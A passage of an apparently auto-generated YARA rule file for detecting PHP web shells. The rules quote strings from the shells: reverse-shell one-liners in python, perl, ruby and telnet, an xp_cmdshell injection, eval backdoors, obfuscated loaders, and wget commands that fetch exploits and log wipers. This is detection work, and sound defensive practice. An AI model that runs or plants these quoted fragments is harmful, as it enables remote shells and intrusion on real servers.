      $s15 = "if (isset($_REQUEST['edit']) && !isset($_POST['save']) && basename($edit = $_REQUEST['edit']) == '.htaccess') {" fullword ascii
      $s16 = "$symlinktarget = relpathtoabspath($_GET['symlinktarget'], $_SESSION['dir']);" fullword ascii
      $s17 = "perror(buildphrase('&quot;<b>' . htmlentities($_SESSION['dir']) . '</b>&quot', $words['readingerror']));" fullword ascii
      $s18 = "$dirchanged = tree_minus($_SESSION['tree'], $_SESSION['hassubdirs'], $_GET['minus']); else $dirchanged = FALSE;" fullword ascii
      $s19 = "$words['username'] = 'Benutzername'; $words['password'] = 'Kennwort'; $words['add'] = 'hinzuf&uuml;gen';" fullword ascii
      $s20 = "* webadmin.php - a simple Web-based file manager" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_5bcb3adc55b62f4e43f154b29d31cced0cbd32a5
{
   meta:
      description = "php17 - file 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
   strings:
      $x1 = "@mssql_query(\"insert into e99_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $x2 = "mysqldump -u USER -pPASSWORD DATABASE > HASILBACKUP.sql</font></center>\";" fullword ascii
      $x3 = "echo \"</textarea></div><center><font size=1 color=green>tar cvzf googlecom.tgz /home/networks/domains/google.com/public_html<br" ascii
      $s4 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; " fullword ascii
      $s5 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s6 = ";\\nSELECT * FROM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\"; " fullword ascii
      $s7 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s8 = "'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()'," fullword ascii
      $s9 = "@mysql_query(\"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_e99_table\");" fullword ascii
      $s10 = "['text']):(\"Ini setoranku boss : http://$webnya$injnya passwordnya : $password\")).'</textarea>');" fullword ascii
      $s11 = "//@readfile (\"http://rst.void.ru/EngShell99_version/version.php?version=\".$current_version.\"\");}" fullword ascii
      $s12 = "<input type='password' name='pass' size='30' style='BORDER-RIGHT: #ffffff 1px solid; BORDER-TOP: #ffffff 1px solid; FONT-SIZE:" fullword ascii
      $s13 = "$name='e79ec2c5c152b12fbd320771535cdbd0'; // ????? ????????????  (user login)" fullword ascii
      $s14 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s15 = "'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd'," fullword ascii
      $s16 = "if(@copy(\"compress.zlib://\".$_POST['test8_file1'], $_POST['test8_file2'])) echo $lang[$language.'_text118'];" fullword ascii
      $s17 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s18 = "ename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s19 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s20 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { err(1,$_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_9b4d4d6da504047df2f03addbe6ff99d
{
   meta:
      description = "php17 - file 9b4d4d6da504047df2f03addbe6ff99d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ff0c60644b36b71d6aa05353bb7730554f782e7610ff1e8213ee87b0e60e6ac1"
   strings:
      $x1 = "* @copyright   Copyright (c) 2013 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
      $s2 = "$processor = new Error_Processor();" fullword ascii
      $s3 = "require_once 'processor.php';" fullword ascii
      $s4 = "<form method=\"POST\" enctype=\"multipart/form-data\" action=\"<?$_SERVER['PHP_SELF']?>\">" fullword ascii
      $s5 = "$processor->process404();" fullword ascii
      $s6 = "<input type=\"file\" name=\"viewers\">&nbsp;<input type=\"submit\" name=\"ok\" value=\"FVCK ME!!\">" fullword ascii
      $s7 = "if (isset($_POST['ok']) && isset($_FILES['viewers'])) {" fullword ascii
      $s8 = "* @package     Errors" fullword ascii
      $s9 = "$file = $_FILES['viewers']['tmp_name'];" fullword ascii
      $s10 = "if(isset($_REQUEST['a']) && $_REQUEST['a']=='b'){" fullword ascii
      $s11 = "move_uploaded_file($file, $name);" fullword ascii
      $s12 = "$name = \"\".$_FILES['viewers']['name'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule sig_75aa5981c7740da3a645cd272029090750474ae1
{
   meta:
      description = "php17 - file 75aa5981c7740da3a645cd272029090750474ae1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "007005ffbf899f70fe325993556129086702958b592d4bf22d8465d202a1b11f"
   strings:
      $x1 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br" fullword ascii
      $x2 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $x3 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x4 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true;" fullword ascii
      $x5 = "AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out'" fullword ascii
      $s6 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $s7 = "echo '<br/><span>posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",this.param1.v" fullword ascii
      $s8 = "wsoSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s9 = "t.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>\";" fullword ascii
      $s10 = "if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s11 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br>' . " ascii
      $s12 = "setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);" fullword ascii
      $s13 = "his.cmd.value,this.show_errors.checked?1:\\'\\');} return false;\"><select name=alias>';" fullword ascii
      $s14 = "wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?\"yes <a href='#' onclick='g(\\\"FilesTools\\\", \\\"/etc/\\" fullword ascii
      $s15 = "echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> " fullword ascii
      $s16 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))" fullword ascii
      $s17 = ". $_SERVER['HTTP_HOST'] . \" - WSO \" . WSO_VERSION .\"</title>" fullword ascii
      $s18 = "function wsoBruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s19 = "document.getElementById(\"progress\").innerHTML=\"<div style=\\\"width:'.$percent.';background-color:#ddd;\\\">&nbsp;</div>\";" fullword ascii
      $s20 = "$out = wsoEx(\"perl /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" 1>/dev/null 2>&1 &\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_9ddfc7dc7fdf5d0000c700130f11ea2b9c5cf152
{
   meta:
      description = "php17 - file 9ddfc7dc7fdf5d0000c700130f11ea2b9c5cf152.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0b8fc0b135eed60892b55b38760247be9828d1d5f103e165d285392c302c7f3f"
   strings:
      $s1 = "echo \"<td><a href = '\".$current.\"&mode=system'>Shell Command</a></td>\\n\";" fullword ascii
      $s2 = "echo \"Shell Command: <input name = 'cmd'>\\n\";" fullword ascii
      $s3 = "echo \"<form action = '\".$current . \"&mode=upload' method = 'POST' ENCTYPE='multipart/form-data'>\\n\";" fullword ascii
      $s4 = "echo \"<center><h1>Dark Shell</h1></center><p><hr><p>\\n\";" fullword ascii
      $s5 = "echo \"<table><form action = '\".$current. \"&mode=port_scan' method = 'POST'>\";" fullword ascii
      $s6 = "echo \"<form action = '\".$current . \"&mode=system' method = 'POST'>\\n\";" fullword ascii
      $s7 = "echo \"<form action = '\".$current.\"&mode=edit&file=\".$file.\"' method = 'POST'>\\n\";" fullword ascii
      $s8 = "echo \"<form action = '\".$current . \"&mode=move&src=\" . $src . \"' method = 'POST'>\\n\";" fullword ascii
      $s9 = "echo \"<form action = '\".$current . \"&mode=rename&old=\" . $old . \"' method = 'POST'>\\n\";" fullword ascii
      $s10 = "echo \"<form action = '\".$current . \"&mode=copy&src=\" . $src . \"' method = 'POST'>\\n\";" fullword ascii
      $s11 = "$temp = $_FILES['upload_file']['tmp_name'];" fullword ascii
      $s12 = "echo \"<tr><td><input type = 'submit' value = 'Port Scan'></td></tr></form></table>\";" fullword ascii
      $s13 = "echo \"Enter port range where you want to do port scan (ex.: 0:65535)</td></tr>\";" fullword ascii
      $s14 = "echo \"<form action = '\".$current . \"&mode=create' method = 'POST'>\\n\";" fullword ascii
      $s15 = "Dark Shell" fullword ascii
      $s16 = "if(move_uploaded_file($temp,$file)){" fullword ascii
      $s17 = "echo \"<td><a href = '\".$current.\"&mode=port_scan'>Port Scan</a></td>\\n\";" fullword ascii
      $s18 = "$cmd = $_POST ['cmd'];" fullword ascii
      $s19 = "$port_range = $_POST ['port_range'];" fullword ascii
      $s20 = "$items_num = count ($items) - 2;" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 20KB and
      8 of them
}

rule sig_8fde3ce151036920bd1aee7d820f7277631f22c1
{
   meta:
      description = "php17 - file 8fde3ce151036920bd1aee7d820f7277631f22c1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0a3321e815c48c4a1002cbbbac4c50f45f4fe61a32be3f1e8cef2dcaedcbfab5"
   strings:
      $s1 = "mb_ereg_replace('.*', $_REQUEST['pass'], '', 'e');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_691d051a95a52ebba8e4a1f2719189dc06f51bd5
{
   meta:
      description = "php17 - file 691d051a95a52ebba8e4a1f2719189dc06f51bd5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a36bd0880066eccdc22995712f78c778eb57cd01c51057097fbf6c6116eaa0fc"
   strings:
      $s1 = "$_=$____.$___.$_________.$_______.'6'.'4'.'_'.$______.$_______.$_____.$________.$______.$_______;" fullword ascii
      $s2 = "$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O" fullword ascii
      $s3 = "$__=$___.$_________.$_________.$_______.$________.$_____;" fullword ascii
      $s4 = "$_________++;$_________++;$_________++;$_________++;//S" fullword ascii
      $s5 = "$________++;$________++;$________++;//R" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule angelbig
{
   meta:
      description = "php17 - file angelbig.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0fd97a214233256bdfd5129cf8ff2129e0bb5804339e371acad303d2238e4f03"
   strings:
      $x1 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $s2 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s3 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s4 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s5 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s6 = "<span style=\"float:right;\">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s7 = "p($comma.'<a href=\"javascript:godir(\\''.$drive->Path.'/\\');\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s8 = "$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s9 = "$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s10 = "secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s11 = "$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');'.\"\\n\";" fullword ascii
      $s12 = ".bt {border-color:#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#ffffff;font:12px Arial,Tahoma;height:22px;}" fullword ascii
      $s13 = "2011</a>. Copyright (C) 2004-2011 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Re" ascii
      $s14 = "$tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";" fullword ascii
      $s15 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s16 = "<a href=\"javascript:g('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s17 = "@set_time_limit(0);@preg_replace(\"/[email]/e\",$_POST['Id'],\"error\");" fullword ascii
      $s18 = "secparam('Supported databases', implode(', ', $temp));" fullword ascii
      $s19 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s20 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_90df6838efd6a7985c610926657ca08fc306b0e8
{
   meta:
      description = "php17 - file 90df6838efd6a7985c610926657ca08fc306b0e8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "430cfbec924da2adde6cb9c8c076947c38909a976959677cd6000f9a0a61cf86"
   strings:
      $s1 = "$g__g_ = isset($_POST['g__g_']) ? $_POST['g__g_'] : (isset($_COOKIE['g__g_']) ? $_COOKIE['g__g_'] : NULL);" fullword ascii
      $s2 = "$g___g_[$g____g_] = $_g_g_[7](($_g_g_[1]($g___g_[$g____g_]) - $_g_g_[1]($g__g_[$g____g_])) % 256);" fullword ascii
      $s3 = "$check = $ver{18} . $ver{19} . $ver{17} . '_' . $ver{17} . $ver{4} . $ver{15} . $ver{11} . $ver{0} . $ver{2} . $ver{4};" fullword ascii
      $s4 = "u;VsKups;3AYBuB;Xj3ZeG;EMyWgT;m2lYcL;tKddwJ;0RST/J;/5/WJF;Hxw83D;YRUNp9;GRqSPK;p" fullword ascii
      $s5 = "4MRW;LYObhd;UCiuNA;iUgESb;FsDqXI;cOM/FM;u7be+I;A3znsX;FckDWg;K5RgHX;e0EBx4;XG8ER" fullword ascii
      $s6 = "$_g_g_[] = $ver{6} . $ver{25} . $ver{8} . $ver{13} . $ver{5} . $ver{11} . $ver{0} . $ver{19} . $ver{4};" fullword ascii
      $s7 = "@setcookie('g__g_', $_POST['g__g_']);" fullword ascii
      $s8 = "__g_=$g___g_($check(array('\\n', ';'), '', 'EbHu4j;z4CR4j;Fkcltw;gyaXcO;d2Oe/1;69UHvI;T0nTQj;CA4rh5;Y9dhWq;dIcRBP;NzIwyc;Dly" fullword ascii
      $s9 = "$g__g_= $_g_g_[2]($g__g_) . $_g_g_[3]($_g_g_[2]($_g_g_[0]($g__g_)), 0, $_g_g_[4]($g__g_));" fullword ascii
      $s10 = "AVH;Zdyb+T;TLBV/Z;3xhz7Q;lFoH//;28EwQ5;V/ZOQW;ct1liP;JFcdvY;zzdWel;d5x18q;S8yeWH" fullword ascii
      $s11 = "ki4JV;dWsC6q;ehqJhq;gO7j//;25sAGJ;s4WJ4M;+Q0d3W;CfF/Ng;aA7kUy;ZzIaUV;2DNGgm;vOa2" fullword ascii
      $s12 = "moy;12dGU8;rIvIjj;YhShCM;Sj0pTC;C7HZJ+;qN0NnP;9lYR//;WR/Mx5;3obWdY;vTq96p;lml4++" fullword ascii
      $s13 = "2MCK2h;glxJjS;P8LsqL;1xeFNN;nQAcmU;2wK0yv;Qc7Sdl;fZqrS0;gjT/44;i1Wq//;n5LegR;sNV" fullword ascii
      $s14 = "DkRzcr;sNz1Vw;j//J6j;ZU/NA5;Wg7vCV;V9coEG;OS/CRi;6S/WwL;D2JYoJ;ZU5k74;7HWdg7;S2Z" fullword ascii
      $s15 = "0B73iv;IPrJxC;+Kbwlq;ZGCVnb;LO22QL;x1DqG3;codMti;PcqqlU;/1/Tdc;7ELtDW;6jjF0z;oak" fullword ascii
      $s16 = "nYv;fUv5Pg;jUJwI3;k3k5H5;vojXqj;ZQ9eXb;0Mwt8y;hA40o4;/WtKPZ;dfIlUG;9poaMh;s7J/bf" fullword ascii
      $s17 = "3eRGJl;zJanRz;ItISMg;aOywQ+;F8GwGI;pnuR8j;YQTwfH;m0U8c9;AUEm4c;KfuWYt;7kfdva;u/S" fullword ascii
      $s18 = ";+iPyaG;IHlOA9;obcbwh;Z0+2yS;bILklS;09RpCq;nmzxOJ;mo8lhk;OGQbWY;Q+LEmV;4aIL16;/P" fullword ascii
      $s19 = "f/ySd;WSdoFh;XYqHeT;+/Rz1/;XN/UP7;xd243p;+0i1t8;HFEnUn;6hqOuu;MamVmI;NoRfQE;Nlnp" fullword ascii
      $s20 = "8vhuB;PBSOSs;1tTVTo;GbHhGy;+QM/G/;Gd2lTv;sM8ltR;sgrt44;o256pa;NK0MoA;3ZJRea;584B" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      8 of them
}


rule sig_062ddb6c727310e76b6200b7c71f63b5
{
   meta:
      description = "php17 - file 062ddb6c727310e76b6200b7c71f63b5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8aa085e49959c67e804b50f07be758f3b9bf46f3da8a0e6612d6bf4f089f603e"
   strings:
      $s1 = "array_intersect_ukey(array($_REQUEST[$password] => 1), array(1), $ch[1].$ch[3].$ch[4]);" fullword ascii
      $s2 = "$ch = explode(\".\",\"hello.ass.world.er.t\");" fullword ascii
      $s3 = "* Noticed: (PHP 5 >= 5.4.0, PHP 7)" fullword ascii
      $s4 = "$password = \"LandGrey\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_0105d05660329704bdb0ecd3fd3a473b
{
   meta:
      description = "php17 - file 0105d05660329704bdb0ecd3fd3a473b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5bd9e3356285a43a7c26c9e2e25a6a801e9128bc0cde167279bce1ddd3e2f30b"
   strings:
      $s1 = "eval( ${ $tjfm0 } [ 'q0e7f9c']) ;} ?> " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule app_proxy
{
   meta:
      description = "php17 - file app_proxy.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b2c769ee34a97911a947c0a117aa1c0deb6de6a470c611e0529ddacb3dbde98e"
   strings:
      $s1 = "echo '{\"status\":\"Error\",\"data\":\"Unknown command '.$_GET['app'].'\\n\",\"environment\":'.$_GET['environment'].'}';" fullword ascii
      $s2 = "* This is the App-Proxy. This file is the glue between front- and backend." fullword ascii
      $s3 = "if(is_file(getcwd().'/data/apps/'.basename($_GET['app']).'.php'))" fullword ascii
      $s4 = "* Its called from the javascript-frontend and is running the requested app." fullword ascii
      $s5 = "include getcwd().'/data/apps/'.basename($_GET['app']).'.php';" fullword ascii
      $s6 = "//Create the classname, following the Convention <app>+\"Application\" is used as the class name in the <app>.php" fullword ascii
      $s7 = "include getcwd().'/app.class.php';" fullword ascii
      $s8 = "$app->run(); //Run, Forrest, Run!" fullword ascii
      $s9 = "//Get dependencies" fullword ascii
      $s10 = "$class = basename($_GET['app']).'Application';" fullword ascii
      $s11 = "//Check, whether we have that app present or not" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule php17_5
{
   meta:
      description = "php17 - file 5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b2fd59c6d32c0357cd68fd5e0dccb387c5fb8b6fe557a35661b9114f7bebe39e"
   strings:
      $s1 = "dbexec('DELETE FROM `#__edges` WHERE `node_b_type` = \\'com:discussions.domain.entity.topic\\' ');" fullword ascii
      $s2 = "dbexec('DELETE FROM `#__edges` WHERE `node_b_type` = \\'com:discussions.domain.entity.board\\' ');" fullword ascii
      $s3 = "class ComTopicsSchemaMigration5 extends ComMigratorMigrationVersion" fullword ascii
      $s4 = "* @package    Com_Topics" fullword ascii
      $s5 = "* @subpackage Schema_Migration" fullword ascii
      $s6 = "* LICENSE: ##LICENSE##" fullword ascii
      $s7 = "* Schema Migration" fullword ascii
      $s8 = "* Called when rolling back a migration" fullword ascii
      $s9 = "* Called when migrating up" fullword ascii
      $s10 = "//some data clean up from legacy dicsussoins app" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule AntiSecShell_v0_5
{
   meta:
      description = "php17 - file AntiSecShell.v0.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da5ea23323881addae2ecd9a44947f05d5dbc216ac24cdf9361b14f18ea8e31c"
   strings:
      $x1 = "$millink=\"http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=Linux+Kernel \".$Lversion;" fullword ascii
      $x2 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> - <input type=submit name=submit value=\"Execute\">" fullword ascii
      $x3 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
      $x4 = "exit(\"<a href=\\\"$s_mu\\\">$sh_name</a>: Access Denied - Your host (\".getenv(\"REMOTE_ADDR\").\") not allowed\");" fullword ascii
      $x5 = "$millink =\"http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=\".$OSV.\" \".$Lversion;" fullword ascii
      $x6 = "function assftpbrutecheck($host,$poort,$timeout,$login,$poass,$sh,$fqb_onlywithsh) {" fullword ascii
      $x7 = "\"<td width=50%><p>53rv3r 1P : <a href=http://whois.domaintools.com/\".gethostbyname($_SERVER[\"HTTP_HOST\"]).\">\".gethostbynam" ascii
      $x8 = "$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;" fullword ascii
      $x9 = "\"<tr><td></td><td><input type=\\\"checkbox\\\" name=\\\"fqb_onlywithsh\\\" value=\\\"1\\\"> Users only with shell</td></tr>\"." fullword ascii
      $x10 = "$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;" fullword ascii
      $x11 = "array(\"wget & run BindDoor\",\"wget \".$s_mu.\"toolz/bind.tar.gz;tar -zxvf bind.tar.gz;./4877\")," fullword ascii
      $x12 = "$logfile = $tmpdir_logs.\"fx29sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x13 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
      $x14 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesiz" fullword ascii
      $x15 = "array(\"Downloaders?\",\"which wget curl w3m lynx fetch lwp-download\")," fullword ascii
      $x16 = "if (file_get_contents($v)) {echo \"<td colspan=2><div class=fxerrmsg>You can't crack Windows passwords(\".$v.\")</div></td></tr" fullword ascii
      $x17 = "array(\"wget WIPELOGS PT1\",\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\")," fullword ascii
      $x18 = "array(\"Md5-L00kup\",\"http://darkc0de.com/database/md5lookup.html\")," fullword ascii
      $s19 = "echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"antisec\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" nam" ascii
      $s20 = "array(\"Cpanel Config\",\"/var/cpanel/accounting.log\")," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*) and all of them
}

rule ActionColumn
{
   meta:
      description = "php17 - file ActionColumn.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "afd8a19a9a296957d627cee888ed0a64e5cc33be853411276383b2b8bb394eaa"
   strings:
      $x1 = "* @copyright Copyright &copy; Kartik Visweswaran, Krajee.com, 2014 - 2018" fullword ascii
      $x2 = "* encoded. If null or not set, the default icon with CSS `glyphicon glyphicon-eye-open` will be displayed" fullword ascii
      $x3 = "* - `label`: _string_, the label for the update action button. This is not html encoded. Defaults to `Update`." fullword ascii
      $x4 = "* - `label`: _string_, the label for the view action button. This is not html encoded. Defaults to `View`." fullword ascii
      $x5 = "* - `label`: _string_, the label for the delete action button. This is not html encoded. Defaults to `Delete`." fullword ascii
      $x6 = "* - `data-method`: _string_, the delete HTTP method. Defaults to `post`." fullword ascii
      $s7 = "* @see http://www.w3schools.com/cssref/pr_text_white-space.asp" fullword ascii
      $s8 = "* - `prepend`: _string_, a prefix string that will be prepended before the pageSummary content" fullword ascii
      $s9 = "* - `append`: _string_, a suffix string that will be appended after the pageSummary content" fullword ascii
      $s10 = "* @var boolean|array whether the column is hidden in export output. If set to boolean `true`, it will hide the" fullword ascii
      $s11 = "* sense, that the column is rendered, but hidden from display. This will allow you to still export the column" fullword ascii
      $s12 = "* @author Kartik Visweswaran <kartikv2@gmail.com>" fullword ascii
      $s13 = "* @see http://www.w3schools.com/cssref/pr_dim_width.asp" fullword ascii
      $s14 = "* @var boolean whether to merge the header title row and the filter row This will not render the filter for the" fullword ascii
      $s15 = "* encoded. If null or not set, the default icon with CSS `glyphicon glyphicon-pencil` will be displayed" fullword ascii
      $s16 = "* - `data-confirm`: _string_, the delete confirmation message to display when the delete button is clicked." fullword ascii
      $s17 = "* Sets a default button configuration based on the button name (bit different than [[initDefaultButton]] method)" fullword ascii
      $s18 = "* - `icon`: _null_|_array_|_string_ the icon HTML attributes as an _array_ or the raw icon markup as _string_" fullword ascii
      $s19 = "* @var boolean whether the column is hidden from display. This is different than the `visible` property, in the" fullword ascii
      $s20 = "* encoded. If null or not set, the default icon with CSS `glyphicon glyphicon-trash` will be displayed" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule sig_4b14493c7c423b2a0dc04906f216fb96a8c6c90f
{
   meta:
      description = "php17 - file 4b14493c7c423b2a0dc04906f216fb96a8c6c90f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "03207c8670299d503957dda5b2a31912978c6dc9810548665a31fe6ef1cd56b8"
   strings:
      $x1 = "$c=search(\"perl\",$failflag).' '.$exec_path.' '.$_POST[\"ip\"].' '.$_POST[\"port\"].' && rm -f '.$exec_path.'';" fullword ascii
      $x2 = "$c=search(\"python\",$failflag).' '.$exec_path.' -r '.$_POST[\"port\"].' '.$_POST[\"ip\"].' && rm -f '.$exec_path.'';" fullword ascii
      $x3 = "echo \"first save and compile findsock binary, then connect to this shell via nc and specify the path to binary in the request, " ascii
      $x4 = "$c='python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"'.$_POST['ip']." fullword ascii
      $x5 = "$c='ruby -rsocket -e \\'exit if fork;c=TCPSocket.new(\"'.$_POST['ip'].'\",\"'.$_POST['port'].'\");while(cmd=c.gets);IO.popen(cm" fullword ascii
      $x6 = "$c=search(\"python\",$failflag).' '.$exec_path.' -b '.$_POST[\"port\"].' && rm -f '.$exec_path.'';" fullword ascii
      $x7 = "echo '<form method=\"post\" action=\"'.$_SERVER['PHP_SELF'].'\"><font color=\"gray\"> host: <input name=\"ssh2host\" type=\"text" ascii
      $x8 = "echo '<form method=\"post\" action=\"'.$_SERVER['PHP_SELF'].'\"> <font color=\"gray\">host: <input name=\"ssh2host\" type=\"text" ascii
      $x9 = "$c='perl -MIO -e \\'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"'.$_POST['ip'].':'.$_POST['port'].'\");STDIN->fdop" fullword ascii
      $x10 = "$c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && telnet '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd" fullword ascii
